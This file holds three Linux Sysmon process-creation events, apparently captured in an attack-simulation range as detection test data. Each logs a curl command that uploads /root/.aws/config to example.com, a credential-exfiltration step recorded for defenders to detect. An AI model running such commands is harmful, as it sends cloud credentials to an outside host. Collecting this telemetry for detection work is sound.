<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T12:33:26.183691000Z"/><EventRecordID>93864882</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 12:33:26.186</Data><Data Name="ProcessGuid">{ec28c72e-d396-62e3-782d-b124e8550000}</Data><Data Name="ProcessId">22911</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -F userfile=@/root/.aws/config http://example.com</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">ubuntu</Data><Data Name="LogonGuid">{ec28c72e-caa1-62e3-e803-000000000000}</Data><Data Name="LogonId">1000</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-caa1-62e3-48c4-b8cb06560000}</Data><Data Name="ParentProcessId">22840</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">-bash</Data><Data Name="ParentUser">ubuntu</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T12:33:14.607811000Z"/><EventRecordID>93863963</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 12:33:14.610</Data><Data Name="ProcessGuid">{ec28c72e-d38a-62e3-78ad-379917560000}</Data><Data Name="ProcessId">22910</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -F “userfile=@/root/.aws/config” hxxp://example.com</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">ubuntu</Data><Data Name="LogonGuid">{ec28c72e-caa1-62e3-e803-000000000000}</Data><Data Name="LogonId">1000</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-caa1-62e3-48c4-b8cb06560000}</Data><Data Name="ParentProcessId">22840</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">-bash</Data><Data Name="ParentUser">ubuntu</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-07-29T12:33:13.539748000Z"/><EventRecordID>93863850</EventRecordID><Correlation/><Execution ProcessID="4770" ThreadID="4770"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-mhaag-attack-range-8786</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-07-29 12:33:13.542</Data><Data Name="ProcessGuid">{ec28c72e-d389-62e3-788d-737768550000}</Data><Data Name="ProcessId">22909</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -F curl -F “userfile=@/root/.aws/config” hxxp://example.com</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">ubuntu</Data><Data Name="LogonGuid">{ec28c72e-caa1-62e3-e803-000000000000}</Data><Data Name="LogonId">1000</Data><Data Name="TerminalSessionId">751</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec28c72e-caa1-62e3-48c4-b8cb06560000}</Data><Data Name="ParentProcessId">22840</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">-bash</Data><Data Name="ParentUser">ubuntu</Data></EventData></Event>